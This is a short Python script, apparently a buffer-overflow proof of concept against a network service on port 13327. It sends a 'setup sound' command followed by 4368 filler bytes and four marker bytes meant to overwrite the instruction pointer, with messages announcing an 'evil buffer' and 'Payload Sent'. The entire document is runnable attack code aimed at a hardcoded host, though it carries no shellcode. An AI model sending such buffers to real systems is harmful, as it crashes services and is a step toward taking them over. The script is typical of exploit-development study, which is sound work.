#!/usr/bin/python
import socket
import codecs

host= "192.168.211.44"

crash = "\x41" * 4368
eip = "\x42"*4
tail = "\x50"*7

buffer = "\x11(setup sound " + crash + eip + tail + "\x90\x90"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print( "[*]Sending evil buffer..." )

s.connect((host, 13327))
print( s.recv(1024) )

s.send(codecs.encode(buffer,'utf-8'))
s.close()

print( "[*]Payload Sent!" )
